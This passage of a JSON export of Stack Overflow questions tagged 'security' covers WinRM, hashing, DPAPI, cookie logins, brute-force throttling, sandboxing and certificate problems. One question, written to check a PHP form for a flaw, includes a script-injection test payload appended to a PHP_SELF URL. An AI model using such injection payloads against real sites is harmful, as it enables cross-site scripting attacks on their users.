-The client and remote computers are in different domains and there is no trust between the two domains.\n After checking for the above issues, try the following:\n  -Check the Event Viewer for events related to authentication.\n  -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or us\ne HTTPS transport.\n Note that computers in the TrustedHosts list might not be authenticated.\n   -For more information about WinRM configuration, run the following command: winrm help config.\n    + CategoryInfo          :\n    + FullyQualifiedErrorId : WsManError,Microsoft.WSMan.Management.GetWSManCredSSPCommand\n\n[ServerMOSS]: PS C:\\Users\\installerUser\\Documents&gt; Exit-PSSession\n</code></pre>\n\n<p>IT departament execute this command in ServerMOSS:</p>\n\n<pre><code>PS C:\\Users\\installerUser\\Documents&gt; enabled-psremoting -force\n</code></pre>\n\n<p>and they get error:</p>\n\n<pre><code>WinRM already is set upt to receive requests on this machine\nSet-WSManQuickConfig: WinRM cannot process the request. The following error occured while using Negotiate authentication: An unknown security error ocurred.\n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["sql-server","sql-server-2005","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1316,"score":2,"question_id":5166641,"title":"SQL Server Foreign Keys across database boundaries - techniques for enforcement","body":"<p>I have two separate SQL Server 2005 databases (on the same server) </p>\n\n<ul>\n<li>security database  </li>\n<li><p>main application database</p></li>\n<li><p>The security database has a  <strong>user table</strong> with everything needed to authenticate.  - </p></li>\n<li>The application database has a <strong>person table</strong> with extended user details. There is a 1-1 mapping between the security database user table and the application database person table.</li>\n</ul>\n\n<p>I want to enforce a mapping between the user and the person table. I'm assuming that foreign keys can't be mapped across databases thus I am wondering what to do to enforce the integrity of the relationship.</p>\n"},{"tags":["security","hash","sha"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13269606,"title":"Signature/Hash Choice for File Integrity Verification","body":"<p>For a file repository, I need to select a hashing algorithm that will reasonably ensure the integrity of files. </p>\n\n<p>I need an algorithm that anyone (with a bit of effort) would be able to easily use to verify the integrity given the hash. In short, the file may be transferred to the user, along with a hash, and they must be able to verify that the hash comes from the file. </p>\n\n<p>My first choice would be MD5 because there seems to be widely available utilities to verify MD5 hashes, but I'm concerned with the MD5 algorithm being cryptographically broken (ref Wikipedia/US-CERT: <a href=\"http://en.wikipedia.org/wiki/MD5\" rel=\"nofollow\">http://en.wikipedia.org/wiki/MD5</a>)</p>\n\n<p>My second choice would be a SHA-2 algorithm, but I'm concerned about availability of utilities that could easily verify the hash. Most examples I've found show program code to evaluate a hash, but I've found few, if any, utilities that are pre-built (asking users to build their own utility is beyond the 'easily' scope)</p>\n\n<p>What other options are available for generating and evaluating a file hash, or are these two the options that are best?</p>\n"},{"tags":["c#","c++","security","windows-services","certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13269574,"title":"Error : \"Impossible to find object or property\", when loading a private certificate in a Windows service running as LocalSystem","body":"<p>I am developing a Windows service middleware that uses security certificates to perform authentication when it wants to initialize a secure communication channel with remote applications.</p>\n\n<p>The Windows service is a .Net 3.5  application that uses (via a C++/CLI layer) the C++ WinCrypt library in order to load certificates. In particular I am calling the CertFindCertificateInStore method when i accessing the store to load the certificate. The CertFindCertificateInStore uses the “My” system store as store by default.</p>\n\n<p>I have registered my private certificate in the “My” system store either for the current user (the user logged onto the machine) either for the local machine, via the MMC console. Be sure that the certificate is good and it includes my private key.</p>\n\n<p>When i run the Windows service as current user (again the user logged onto the machine)  the certificate is correctly loaded,  instead the certificate is not loaded when i run the service as “LocalSystem”. The error  \"Impossible to find object or property\", is then raised when I call the CertFindCertificateInStore. I point up that the “My” store instead continues to be accessible.</p>\n\n<p>(NB: When I open a new session using a different user and I run the same Windows service as user for whom I registered the certificates, the certificate is again correctly loaded)</p>\n\n<p>Then I used either the MMC console either the winhttpcertcfg.exe system tool in order to verify that the “LocalSystem” user has the rights to access my certificate. Afterwards either the MMC console and the winhttpcertcfg.exe tool confirm that THEORETICALLY the user “LocalSystem” has the rights to access the certificate.</p>\n\n<p>Do you have any suggestion to help me to solve this problem?</p>\n\n<p>Thank you in advance for your help,</p>\n\n<p>PS: a similar question has been posted here <a href=\"http://stackoverflow.com/questions/3936065/certificates-cannot-find-the-certificate-and-private-key-for-decryption-error-w\">Certificates: Cannot find the certificate and private key for decryption Error when sign</a></p>\n"},{"tags":[".net","security"],"answer_count":2,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":850,"score":7,"question_id":1326001,"title":"Windows DPAPI - what to do with entropy?","body":"<p>I'm using the Windows DPAPI to encrypt some sensitive data for me. The cipher is stored in the registry. This all works well, but I was wondering if someone could clarify my understanding of the 'entropy' bytes that are (optionally) supplied to ProtectedData.Protect() in .NET.</p>\n\n<p>The 'entropy' byte array appears to be analogous to an initialization vector or salt used with other cryptography schemes, but I could not see a good description of the entropy bytes in MSDN. The code samples I've seen just hard code in the entropy bytes!</p>\n\n<p>Are the entropy bytes supplied to ProtectedData.Protect() &amp; ProtectedData.Unprotect analogous to an IV or salt? Can the entropy bytes therefore be stored safely alongside the cipher, or would that compromise security?</p>\n"},{"tags":["c++","security","winapi","directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13268625,"title":"Security Attributes when creating folder","body":"<p>I have the following line of code:</p>\n\n<pre><code>CreateDirectory(full_folder, attr);\n</code></pre>\n\n<p>Now the attr variable is of type LPSECURITY_ATRRIBUTES and is currently set to NULL.  Can anyone please provide me with a list of all the keywords that are accepted by this variable.  I have searched over the internet but I can't seem to find a proper list.  Maybe I am not searching correctly.</p>\n\n<p>Thanks :)</p>\n"},{"tags":["java","security","usb-flash-drive","flash-drives"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":38,"score":-1,"question_id":13266473,"title":"USB should block after detection using Java","body":"<p>How can I built a program in Java which block the USB port and when a USB device get attached to it, then the system ask for password (on behalf of my program/service)?</p>\n\n<p>I found some API's for USB security like jUSB, JSR-80. Are they capable to provide this functionality?</p>\n\n<p>I also want to know that how can I secure it as machine/system specific and how can I provide encryption on data level?</p>\n"},{"tags":["web-services","security","web-security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13265301,"title":"what are the available security options when building web services","body":"<p>I am building a web service JSON APIs  for my asp.net MVC web application, currently i performing the following security mechanisms:-</p>\n\n<ol>\n<li>I have defined a master username and password on my web site for each client that will consume any of the web service .</li>\n<li>when any consumer register to use the webs service i send them the master login username and a hash  value representing the password.</li>\n<li>on each web service request i will check if the username and password are valid.</li>\n</ol>\n\n<p>I think that the approach i am following is to a certain level secure, but i am facing the following problems:-</p>\n\n<ol>\n<li><p>The clients will not be able to call any of these web services using JavaScript on the client browser, since on this way they will be exposing the master login username and password , so any web service request should be done on the server and send back to the client. let say the client has an asp.net mvc web application , then all web services requests should be done of the controller or on the module level, and they will not be able to write a javascript which directly call the web services .</p></li>\n<li><p>Is my approach secure? and what other security mechanism i can follow which can be more secure and reliable?</p></li>\n</ol>\n\n<p>Thanks&amp; Best Regards</p>\n"},{"tags":["html","security","same-origin-policy"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":3703,"score":2,"question_id":1131210,"title":"Work around for the same origin policy problem","body":"<p>I have a problem where I have a frameset consisting of a parent frame loaded from one domain and a contained frame from a different domain. The contained domain also sets a cookie before the frameset is loaded. However, because of the 'same orgin' policy, enforced by most browsers, a contained frame will not pass cookies if it is not from the same domain as the parent.</p>\n\n<p>Unfortunately I have no control over the parent frame (or its url) and the url for the contained frame is effectively static. So the only way to pass information to the contained site is via cookies.</p>\n\n<p>The only solution I have come up with is to reload the contained domain in the parent frame but this negates some of the value of using frames in the first place.</p>\n\n<p>Does anyone have a better work around for this problem?</p>\n"},{"tags":["linux","apache","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13252172,"title":"Redirect rule for only home page from http to https","body":"<p>Can we make https for only home page i.e., for </p>\n\n<blockquote>\n  <p>example.com <strong>or</strong> <a href=\"http://example.com\" rel=\"nofollow\">http://example.com</a> <strong>or</strong> www.example.com <strong>or</strong> <a href=\"http://www.example.com\" rel=\"nofollow\">http://www.example.com</a></p>\n</blockquote>\n\n<p>remaining all pages should start with http.</p>\n\n<p>I have tried like this but it isn't worked</p>\n\n<pre><code>RewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} \"^/$\"\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}\n\nRewriteCond %{HTTPS} on\nRewriteCond %{REQUEST_URI} ^(.*)$\nRewriteRule ^(.*) http://%{HTTP_HOST}%{REQUEST_URI}\n</code></pre>\n"},{"tags":["security","cookies","login"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12989778,"title":"Any gotchas I should be aware of regarding this approach to persistent logins (\"Remember Me\")?","body":"<p>This web application will have a database table with columns uniqueid (64-bit int autoincrement field; key), token (64-byte binary field), and an accountid.</p>\n\n<p>After logging in with \"Remember Me\" checked, a random token will be generated. Then the SHA-512 hash of this token will be inserted into the database and the generated uniqueid retrieved. A cookie that contains the uniqueid and unhashed token is sent to the client.</p>\n\n<p>Every time a user visits the page with the cookie, the cookie's uniqueid and its token's SHA-512 hash with be checked against the database. If there is a row that matches the uniqueid, and that row's token hash matches the token hash, log in the user with the row's accountid. After every authentication attempt made by the cookie, delete the row that uses the old uniqueid and, if the authentication was successful, generate a new random token. Then the SHA-512 hash of this token will be inserted into the database and the generated uniqueid retrieved. A cookie that contains the uniqueid and unhashed token is sent to the successfully authenticated client.</p>\n\n<p>I will be using the techniques described <a href=\"http://blog.teamtreehouse.com/how-to-create-totally-secure-cookies\" rel=\"nofollow\">here</a> as well. All failed cookie authentications will have the cookies set to blank values and expiration date set to sometime in the past.</p>\n\n<p>I believe this method would address a few concerns regarding cookies. Namely:</p>\n\n<ol>\n<li><p>The token in the database is hashed so that as long as an attacker does not have write access to the database, he/she will not be able to forge cookies of\nall users.</p></li>\n<li><p>Unique IDs are used instead of a user's account name because login\ncredentials should never be stored in a cookie.</p></li>\n<li><p>A random token is generated every time the cookie is authenticated\nso that if an attacker steals a cookie, it will only be valid until\nthe user next logs in rather than for the entire time the user is\nremembered.</p></li>\n<li><p>Cookies will be difficult to sniff because my entire application uses HTTPS.</p></li>\n</ol>\n\n<p>I can further enhance security by allowing the user to specify how long he/she wants to be remembered for. The expiration date will be stored in the same database table that stores uniqueid and tokens. Every time a new cookie is created, this expiration will be sent with the cookie. If a user tries logging in with a cookie that the server deems expired but the client still holds, the log in will be denied.</p>\n\n<p>I believe this solution is reasonably secure, but are there any pitfalls or things that I have overlooked when I designed this method?</p>\n\n<p>Sources:</p>\n\n<p><a href=\"http://stackoverflow.com/a/8508213/444402\">Hash token in database</a></p>\n\n<p><a href=\"http://stackoverflow.com/a/7591897/444402\">Don't store account name in cookies and use new unique id after every authentication</a></p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13262185,"title":"MD5 the id in URL and get the id to other page using PHP","body":"<p>Suppose that I have code as below:</p>\n\n<pre><code>&lt;td&gt;&lt;a href=\"view_edit_form.php?id=&lt;?php echo md5($row[0]);?&gt;\"&gt;Edit&lt;/a&gt;&lt;/td&gt;\n</code></pre>\n\n<p>And in page <code>view_edit_form.php</code> I get the id by using this code <code>$ID = $_GET['id'];</code></p>\n\n<p><strong>The problem</strong></p>\n\n<p>I can not get the <code>id</code> if I <code>md5</code> it like this.Anyone help me please, Thanks.</p>\n"},{"tags":["linux","security","ubuntu","kernel","kill"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":14,"score":1,"question_id":13261277,"title":"Secure method for killing a process and all offspring","body":"<p>I am creating a sandbox environment in Linux using <a href=\"http://manpages.ubuntu.com/manpages/precise/man2/aa_change_profile.2.html\" rel=\"nofollow\">apparmor</a>, <a href=\"http://manpages.ubuntu.com/manpages/precise/man2/setrlimit.2.html\" rel=\"nofollow\">setrlimit</a>, <a href=\"http://manpages.ubuntu.com/manpages/precise/man3/cap_set_proc.3.html\" rel=\"nofollow\">cap_set_rpoc</a> to let anonymous users basically execute some arbitrary code on my server in the context of a scientific application. One thing that is specifically allowed in the sandbox is starting new processes by forking and calling executables (although the total number of processes by one user is limited by <code>RLIMIT_NPROC</code>).</p>\n\n<p>After a given time period, say 1 minute, the system will kill the main process, and all of the potential children. I am currently relying on the process group id to identify children. However, in theory, a child process could call <code>setpgid</code> to change its process group, so that it will no longer be affected when I call <code>kill(-1 * pid)</code> on the main process id (correct?). Unfortunately, there is no linux <code>capability</code> that I can set to prevent processes from calling <code>setpgid</code>.</p>\n\n<p>What would be a robust way of killing a process and all of its (recursive) children, which would make it very hard for the children to somehow \"escape\" the massacre and continue as orphan processes?</p>\n"},{"tags":["java","python","security","encryption","aes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13262047,"title":"AES Encryption (Python and Java)","body":"<p>I'm making a project in Java and Python that includes sending an encrypted string from one to the other. I can get the languages to understand each other and fully de-crypt / encrypt strings. However I was talking to somebody and was told that I am not being totally secure. I am using AES encryption for the project. Part of the problem is that I am distributing the software and need to come up with an effective way and secure way of making sure both the server side know the <strong>IV</strong> and <strong>'Secret Key'</strong>. Right now the same string will always encrypt to be the same result. If I could change those two factors they would be different, so 2 users with the same password won't have the same encrypted password. Please do keep in mind that the server only needs to manage one account.</p>\n\n<p>I appreciate your responses, and thank you very much ahead of time!</p>\n"},{"tags":["security"],"answer_count":8,"favorite_count":4,"up_vote_count":12,"down_vote_count":0,"view_count":744,"score":12,"question_id":2786628,"title":"Preventing dictionary attacks on a web application","body":"<p>What's the best way to prevent a dictionary attack? I've thought up several implementations but they all seem to have some flaw in them:</p>\n\n<ol>\n<li>Lock out a user after X failed login attempts. Problem: easy to turn into a denial of service attack, locking out many users in a short amount of time.</li>\n<li>Incrementally increase response time per failed login attempt on a username. Problem: dictionary attacks might use the same password but different usernames.</li>\n<li>Incrementally increase response time per failed login attempt from an IP address. Problem: easy to get around by spoofing IP address.</li>\n<li>Incrementally increase response time per failed login attempt within a session. Problem: easy to get around by creating a dictionary attack that fires up a new session on each attempt.</li>\n</ol>\n"},{"tags":["spring","security","authentication","login","messages"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13261794,"title":"Display error messages in Spring login","body":"<p>I am using Spring security for authenticating users. I created a custom authentication provider and now I am wondering how I can get error messages from the provider into my form. This is the authenticate() method in my custom authentication provider:</p>\n\n<pre><code>@Override\npublic Authentication authenticate(Authentication authentication) throws AuthenticationException {\n    UserProfile profile = userProfileService.findByEmail(authentication.getPrincipal().toString());\n\n    if(profile == null){\n        throw new UsernameNotFoundException(String.format(\"Invalid credentials\", authentication.getPrincipal()));\n    }\n\n    String suppliedPasswordHash = DigestUtils.shaHex(authentication.getCredentials().toString());\n\n    if(!profile.getPasswordHash().equals(suppliedPasswordHash)){\n        throw new BadCredentialsException(\"Invalid credentials\");\n    }\n\n    UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(profile, null, profile.getAuthorities());\n\n    return token;\n}\n</code></pre>\n\n<p>This is my form:</p>\n\n<pre><code>&lt;form name='f' action=\"&lt;c:url value='j_spring_security_check' /&gt;\" method='POST'&gt;\n&lt;div id=\"data-entry-form\"&gt;\n\n    &lt;div class=\"form-entry\"&gt;\n        &lt;label&gt;&lt;spring:message code=\"login.form.label.email\"/&gt;&lt;/label&gt;\n        &lt;input type='text' name='j_username' value=''&gt;\n    &lt;/div&gt;\n    &lt;div class=\"form-entry\"&gt;\n        &lt;label&gt;&lt;spring:message code=\"login.form.label.password\"/&gt;&lt;/label&gt;\n        &lt;input type='password' name='j_password'/&gt;\n    &lt;/div&gt;\n    &lt;div class=\"form-entry\"&gt;\n        &lt;input type=\"submit\" value=\"Verzenden\"/&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p></p>\n\n<p>How would I get error messages into my form? From the moment I press the login button, Spring takes over, so the only method I could generate error messages in would be the authenticate() method...</p>\n"},{"tags":["ios","security","passwords","keychain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12437027,"title":"Password in keychain - and people forgetting their password","body":"<p>I have an iOS App that may store confidential information and also uses iCloud to synchronize its Core Data between devices (the data itself is encrypted inside Core Data).</p>\n\n<p>People can protect the App with a password, and can also create two secret questions to help them recover a lost password.</p>\n\n<p>The password and secret questions are kept in the keychain.</p>\n\n<p>Quite often I get support requests that say \"Hey, I forgot my password and I also forgot the answers to my secret questions, so now I cannot access my precious data. Please help\".</p>\n\n<p>Some people also say that they tried to remove the App and re-install it (knowing that the data will be re-synched from iCloud), assuming that this will reset their password, which of course does not happen.</p>\n\n<p>Currently there's no way for me to help these people.</p>\n\n<p>Now here's the question.</p>\n\n<p>On one hand, it's very easy for me to clear the password and secret questions from the keychain on first launch, so that people can create a new one if they remove and re-install the App.</p>\n\n<p>However, this seems to create a security hole. An unauthorized person getting hold of the device can remove the App, re-install it, create a new password, let the App synchronize with iCloud and access the confidential data.</p>\n\n<p>I believe that there are many more innocent people who forget their passwords than people trying to steal other people's data, but I still feel reluctant to go \"the easy way\".</p>\n\n<p>What do you think?</p>\n"},{"tags":["c++","security","fuzzing","fuzzer","fuzz-testing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":48,"score":-7,"question_id":13261011,"title":"Writing a Fuzzing Framework in C++","body":"<p>I have to start writing a fuzzer framework from scratch in C++, no design or functionality documentation is in place. Any inputs?</p>\n"},{"tags":["security","node.js"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13259896,"title":"Node.JS switch user while running","body":"<p>Is it possible for a Node.JS program that is running as root, to downgrade its authority while it is running? This would be one of the first things it does, and the purpose is of course to limit possible damage it could cause, in the unlikely event that there is a vulnerability, or mis-trusted code that runs in this process.</p>\n\n<p>Alternatively, is there a way for Node.JS process that is running as root, to start a separate process which is non-root? (preferably without adding a layer in between, such as sudo)</p>\n"},{"tags":["php","security","xss","sql-injection"],"answer_count":10,"favorite_count":162,"up_vote_count":206,"down_vote_count":0,"view_count":69745,"score":206,"question_id":129677,"title":"What's the best method for sanitizing user input with PHP?","body":"<p>Is there a catchall function somewhere that works well for sanitizing user input for sql injection and XSS attacks, while still allowing certain types of html tags?</p>\n"},{"tags":["php","security","symfony2","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13233026,"title":"Catch AccountStatusException","body":"<p>I would like to implement a custom logic for my users implementing the <a href=\"http://api.symfony.com/2.1/Symfony/Component/Security/Core/User/AdvancedUserInterface.html\" rel=\"nofollow\">AdvancedUserInterface</a></p>\n\n<p>I would like to allow non-enabled users to access some zones (like the account zone where they can change their e-mail if they made a mistake).</p>\n\n<p>According to the documentation : </p>\n\n<blockquote>\n  <p>If any of the methods in this interface return false, authentication\n  will fail.</p>\n  \n  <p>If you need to perform custom logic for any of these situations, then\n  you will need to register an exception listener and watch for the\n  specific exception instances thrown in each case. All exceptions are a\n  subclass of AccountStatusException</p>\n</blockquote>\n\n<p>So I tried to create a Listener by adapting <a href=\"http://symfony.com/doc/current/cookbook/service_container/event_listener.html\" rel=\"nofollow\">this cookbook article</a> to the security events :</p>\n\n<pre><code>&lt;?php\n\nnamespace Acme\\DemoBundle\\Listener;\n\n\nuse Symfony\\Component\\Security\\Core\\SecurityContextInterface;\n\nuse Symfony\\Component\\Security\\Core\\Exception\\AccountStatusException;\n\nclass NecdocPatientExceptionListener\n{\n    public function onKernelException($event)\n    {\n        // Handle event\n    }\n}\n</code></pre>\n\n<p>And I've added it to the bundle's services.xml :</p>\n\n<pre><code>services:\n    kernel.listener.acme_user_exception_listener:\n        class: Acme\\DemoBundle\\Listener\\AcmeExceptionListener\n        tags:\n            - { name: kernel.event_listener, event: security.authentication.success, method: onKernelException }\n</code></pre>\n\n<p>This catches \"AuthenticationFailureEvent\" : when the user enters bad credentials, but not AccountStatusException.\nI've been looking to the Security component code, and it seems that exceptions are caught without triggering any events.\nIs there a way to catch those exceptions anyways ?</p>\n"},{"tags":["spring","security","roles","rights","authority"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13220149,"title":"How do roles and rights translate to Spring Security?","body":"<p>In my applications I usually create three tables for access management. Roles, Rights and an association table that maps between Roles and Rights.</p>\n\n<p>I am trying to translate this approach to Spring security and after reading [this article][1] I thought I was on the right track. I created a custom AuthenticationProvider and implemented the <code>authenticate()</code> method like so:</p>\n\n<pre><code>@Override\npublic Authentication authenticate(Authentication authentication) throws AuthenticationException {\n    UserProfile profile = userProfileService.findByEmail(authentication.getPrincipal().toString());\n\n    if(profile == null){\n        throw new UsernameNotFoundException(String.format(\"Invalid credentials\", authentication.getPrincipal()));\n    }\n\n    String suppliedPasswordHash = DigestUtils.shaHex(authentication.getCredentials().toString());\n\n    if(!profile.getPasswordHash().equals(suppliedPasswordHash)){\n        throw new BadCredentialsException(\"Invalid credentials\");\n    }\n\n    UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(profile, null, profile.getAuthorities());\n\n    return token;\n}\n</code></pre>\n\n<p>The <code>profile.getAuthorities()</code> method creates a list of Rights (rights are wrapped in my own implementation of GrantedAuthority).  So, the UsernamePasswordAuthenticationToken object is created with this list. This is the UserProfile.getGrantedAuthorities() method that takes care of this:</p>\n\n<pre><code>public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {\n    Set&lt;ProduxAuthority&gt; authorities = new HashSet&lt;ProduxAuthority&gt;();\n    for (Role role : roles) {\n        for (Right right : role.getRights()) {\n            ProduxAuthority produxAuthority = new ProduxAuthority(right.getName());\n            authorities.add(produxAuthority);\n        }\n    }\n    return authorities;\n}\n</code></pre>\n\n<p>My question is whether this is a correct approach. I am getting the impression that I should stuff roles into GrantedAuthorities instead of rights, but I would like to use rights to secure methods and urls, because it gives me more fine grained control  over authorization. How would I accomplish this? And what is the difference between a ROLE and a PERMISSION in Spring? Do permissions map to rights and could I use hasPermission() to secure stuff bases on rights instead of roles? </p>\n"},{"tags":["java","web-services","security","encryption","md5"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13234013,"title":"String decryption for webservice","body":"<p>I have a web service (Java) which requires a password for all cases. But the password must be come to me securely. Is there a standard way for all platforms -> java encryption/decryption. How can I decrypt a string which could come a random platform(php,.net,iPhone).</p>\n"},{"tags":["ajax","json","security","html-entities"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13236415,"title":"Security benefits of encoding HTML special characters in JSON responses","body":"<p>I have recently received a recommendation, from a third party, to encode HTML special characters in all server responses \"for security reasons\". So:</p>\n\n<pre><code>' --&gt; &amp;#x27;\n&amp; --&gt; &amp;#x26;\n</code></pre>\n\n<p>e.g.</p>\n\n<pre><code>{ \"id\": 1, \"name\": \"Miles O&amp;#x27;Brien\" }\n</code></pre>\n\n<p>Question: Is there a security gain in doing this, or is it just a paranoia?</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":54,"score":0,"question_id":13247997,"title":"$_SERVER['PHP_SELF'] vulnerability not \"working\"?","body":"<p>Looking at an old code of a client, he's using</p>\n\n<pre><code>&lt;form action=\"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;\" /&gt;\n</code></pre>\n\n<p>I was wondering if it was subject to XSS, but when I try :</p>\n\n<ul>\n<li><code>form.php\"&gt;&lt;script&gt;alert('xss');&lt;/script&gt;</code> => 404 NOT FOUND from Apache</li>\n<li><code>form.php/\"&gt;&lt;script&gt;alert('xss');&lt;/script&gt;</code> => 404 From my app</li>\n</ul>\n\n<p>I must specify that I also use ?action=specific_page in the url for its normal use.</p>\n\n<p>Does that mean no XSS is possible using <code>PHP_SELF</code> or does that mean I'm trying it the wrong way?</p>\n"},{"tags":["facebook","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5,"score":0,"question_id":13256680,"title":"Which User Privacy/Security Settings can be accessed via the Facebook API?","body":"<p>I want to be able to display a users Facebook privacy settings in a third party application (the user would provide FB login details to that application).</p>\n\n<p>Is this possible? I don't want to be able to change any settings, just display them.</p>\n\n<p>Also, is the same possible for Albums i.e. get a list of public/private albums?</p>\n\n<p>Thanks.</p>\n"},{"tags":["windows","security","events","source"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":12,"score":0,"question_id":13256537,"title":"Windows Event Log - How to register a Security event source Programmatically?","body":"<p>i want to register a 'security' event source and unregister that to generate log with event id -4904 and 4905 respectively, to test my application. how can i do so?</p>\n"},{"tags":["wcf","security","certificate"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":7291,"score":5,"question_id":1701437,"title":"WCF service certificate and client side endpoint identity - why it doesn't work?","body":"<p>[Update] - I attach also full config files, for <a href=\"http://gist.github.com/230024\">service</a>, and for <a href=\"http://gist.github.com/230026\">client</a> (outside of here, not to flood the topic)</p>\n\n<p>I'm having situation pretty much identical to the one outlined in <a href=\"http://stackoverflow.com/questions/1577115/wcf-service-certificate-implications-of-certificatevalidationmodenone-and-revo\">this</a> question, however my question is somewhat different.</p>\n\n<ul>\n<li>I'm using NetTcpBinding with security\nset to TransportWithMessageCredential</li>\n<li>I'm using Password/Username\ncredentials backed up by ASP.NET\nprovider</li>\n<li>My service is self hosted in Windows\nService</li>\n<li>I <strong>do</strong> have in my endpoint behavior\nspecified authentication\nrevocationMode=\"NoCheck\"</li>\n</ul>\n\n<p>It is required that the service provides a certificate to authenticate itself to clients. That's OK, I just do:</p>\n\n<pre><code>&lt;serviceCertificate findValue=\"***\"\n                    storeLocation=\"CurrentUser\"\n                    storeName=\"My\"\n                    x509FindType=\"FindByThumbprint\"/&gt;\n</code></pre>\n\n<p>Now, I somewhat imagined that now the client would end up having</p>\n\n<pre><code>&lt;identity&gt;\n  &lt;certificate encodedValue=\"encoded certificate\"/&gt;\n&lt;/identity&gt;\n</code></pre>\n\n<p>And it will be able to verify service's credentials <strong>without having that certificate installed in the store on client machine</strong>.</p>\n\n<p>I was surprised <a href=\"http://msdn.microsoft.com/en-us/library/ms733130.aspx\">to learn</a> that although I set the service credentials to certificate, <a href=\"http://en.wikipedia.org/wiki/Web%5FServices%5FDescription%5FLanguage\">WSDL</a> exposes </p>\n\n<pre><code>&lt;Identity&gt;\n   &lt;Dns&gt;Foo&lt;/Dns&gt;\n&lt;/Identity&gt;\n</code></pre>\n\n<p>Again, on service I can set Identity to CertificateReference and hook it up to the same certificate, and then WSDL will expose identity as X509Certificate, but when I run the client that setting is ignored, and I end up with error message:</p>\n\n<blockquote>\n  <p>System.ServiceModel.Security.SecurityNegotiationException:\n  The X.509 certificate CN=xxx is not in\n  the trusted people store. The X.509\n  certificate CN=xxx chain building\n  failed. The certificate that was used\n  has a trust chain that can not be\n  verified. Replace the certificate or\n  change the certificateValidationMode.\n  A certificate chain processed, but\n  terminated in a root certificate which\n  is not trusted by the trust provider.</p>\n</blockquote>\n\n<p>Is there a way to make client use that value from config and work without having to install a service certificate (nor its root) on client' machine?</p>\n\n<p><strong>[UPDATE]</strong>\nWhile setting certificateValidationMode to none will make the exception go away, it is unacceptable solution from security point of view.</p>\n\n<p>It makes the client merely acknowledge that it receive ''some'' certificate, without getting into details. This makes all range of man in the middle attacks possible. It still won't validate the information sent by (alleged) service against the certificate dumped in the config.</p>\n"},{"tags":["ios","security","unit-testing","ios-simulator","keychain"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":90,"score":4,"question_id":13087175,"title":"Keychain Services API fails with errSecNotAvailable in iphonesimulator 6.0","body":"<p>Calls to the the Keychain Services fail with <strong>errSecNotAvailable</strong> when executing a target using the command line tools and the iphone simulator is set to Hardware version 6.0 (10A403). If I change the simulator version to other previous version (4.3, 5.0, 5.1) and re-execute using the same command line script the calls succeed.</p>\n\n<p>I'm running latest XCode 4.5 and the command line tools were downloaded from within XCode.</p>\n\n<p>To reproduce this error just do the following:</p>\n\n<ol>\n<li>Setup an ios library project with a OCUnit target</li>\n<li>Set Base SDK to 6.0</li>\n<li>Set iOS Deployment Target to 4.3</li>\n<li>Copy and paste the code st the end of the post into the test project (it will only try to store a password and retrieve it)</li>\n<li>Add the Security.framework to the OCUnit target</li>\n</ol>\n\n<p>Execute the OCUnit target in XCode and see the test pass with whatever Hardware Version is set in the iphone simulator (just change it between executions).</p>\n\n<p>Execute the OCUnit target from the command line using:</p>\n\n<pre><code>xcodebuild -target TARGET_NAME_HERE -sdk iphonesimulator -configuration Release TEST_AFTER_BUILD=YES\n</code></pre>\n\n<p>with iphone simulator set to Hardware Version 6.0 and the test will <strong>fail</strong>. If you change the iphone simulator Hardware Version to 4.3, 5.0 or 5.1 and execute the command line script again the test will <strong>succeed</strong>.</p>\n\n<p>Is this a command line tool problem? an iphone simulator problem? an OCUnit target running from the command line problem?</p>\n\n<p>Who likes having unit tests that only pass when comets are aligned??</p>\n\n<p>Any ideas?</p>\n\n<p>Here is the code:</p>\n\n<pre><code>#define 